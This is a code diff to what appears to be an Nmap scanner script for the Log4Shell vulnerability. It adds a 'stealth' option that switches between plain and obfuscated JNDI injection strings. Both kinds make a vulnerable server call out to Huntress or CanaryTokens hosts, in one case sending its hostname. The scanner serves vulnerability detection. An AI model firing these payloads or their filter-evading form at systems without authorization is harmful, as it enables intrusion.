@@ -31,21 +31,31 @@ local function read_templates(path)
     return templates
 end
 
-local function get_payload(mode, id)
+local function get_payload(mode, id, stealth)
     -- Huntress payload
     if mode == "huntress" then
-        return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4shell.huntress.com:1389/%s}"):format(id)
+        if stealth == nil then
+            return ("${jndi:ldap://log4shell.huntress.com:1389/%s}"):format(id)
+        else
+            return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4shell.huntress.com:1389/%s}"):format(id)
+        end
     end
 
     -- CanaryToken payload
     if mode == "canary_tokens" then
-        return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
+        if stealth == nil then
+            return ("${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
+        else
+            return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
+        end
     end
 
     return nil
 end
 
 action = function(host, port)
+
+    local stealth = stdnse.get_script_args("stealth")
 
     local mode = stdnse.get_script_args("mode")
     if mode == nil then
@@ -69,7 +79,7 @@ action = function(host, port)
         payload = ("${%s}"):format(stdnse.get_script_args("payload"))
         payload = payload:format(id)
     else
-        payload = get_payload(mode, id)
+        payload = get_payload(mode, id, stealth)
     end
     if payload == nil then return "ERROR: invalid mode or id" end
         
